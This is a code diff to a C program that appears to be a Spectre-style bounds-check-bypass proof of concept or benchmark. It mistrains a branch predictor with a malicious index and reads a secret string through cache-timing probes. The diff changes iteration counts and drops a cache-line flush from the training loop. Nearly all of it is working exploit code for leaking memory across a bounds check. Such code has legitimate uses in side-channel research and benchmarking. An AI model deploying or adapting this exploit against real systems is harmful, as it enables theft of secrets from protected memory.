@@ -17,10 +17,10 @@
 #define CACHELINE_SIZE 64
 #endif
 #ifndef ITERS
-#define ITERS 1000
+#define ITERS 500
 #endif
 #ifndef TRAIN_REPS
-#define TRAIN_REPS 100
+#define TRAIN_REPS 50
 #endif
 #ifndef THRESHOLD
 #define THRESHOLD 120
@@ -126,13 +126,11 @@ void initialize_array() {
 }
 
 __attribute__((noinline))
-static void train_then_attack(size_t malicious_x, unsigned int attempt,
-                              const void *flush_addr) {
+static void train_then_attack(size_t malicious_x, unsigned int attempt) {
+    // always in range of array
     size_t training_x = attempt % ARRAY_SIZE;
 
     for (volatile int j = 0; j <= TRAIN_REPS; ++j) {
-        _mm_clflush(flush_addr);
-        _mm_lfence();
         size_t x = (j == TRAIN_REPS) ? malicious_x : training_x;
         victim(x);
     }
@@ -158,12 +156,10 @@ static int run_bench_byte(int num_trials, int threshold, int flush_target) {
         int idx = rand() % TARGET_ARRAY_SIZE;
         unsigned char target_value = target_array[idx];
         const void *target_addr = (const void *)&target_array[idx];
-        const void *flush_addr = flush_target ? target_addr
-                                              : (const void *)&dummy_flush_byte;
         uintptr_t diff = (uintptr_t)target_addr - (uintptr_t)array;
 
         specexp_flush_buffer(probe_buf, (size_t)PAGE_SIZE * NUM_PAGES);
-        train_then_attack((size_t)diff, (unsigned int)t, flush_addr);
+        train_then_attack((size_t)diff, (unsigned int)t);
         int found = specexp_probe_argmin(probe_buf, SPECEXP_NUM_PAGES, threshold,
                                          skip_low, order, &lcg_state);
         printf("%s,%d,%d,%d,%s\n", variant, t, (int)target_value, found,
@@ -200,7 +196,6 @@ int main(int argc, char **argv) {
     const int cpu = 0;
     const int secret_len = (int)strlen(secret);
     char guessed[sizeof(secret)] = {};
-    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;
 
     pin_cpu(cpu);
     initialize_array();
@@ -210,6 +205,9 @@ int main(int argc, char **argv) {
     int order[NUM_PAGES];
     unsigned int lcg_state = 1;
 
+
+
+    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;
     printf("array=%p secret=%p malicious_base_x=%zu\n",
            (void *)array, (const void *)secret, (size_t)diff);
 
@@ -219,7 +217,7 @@ int main(int argc, char **argv) {
 
         for (int i = 0; i < ITERS; ++i) {
             flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
-            train_then_attack(malicious_x, (unsigned int)i, (const void *)&dummy_flush_byte);
+            train_then_attack(malicious_x, (unsigned int)i);
 
             int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
             if (found >= 0) {
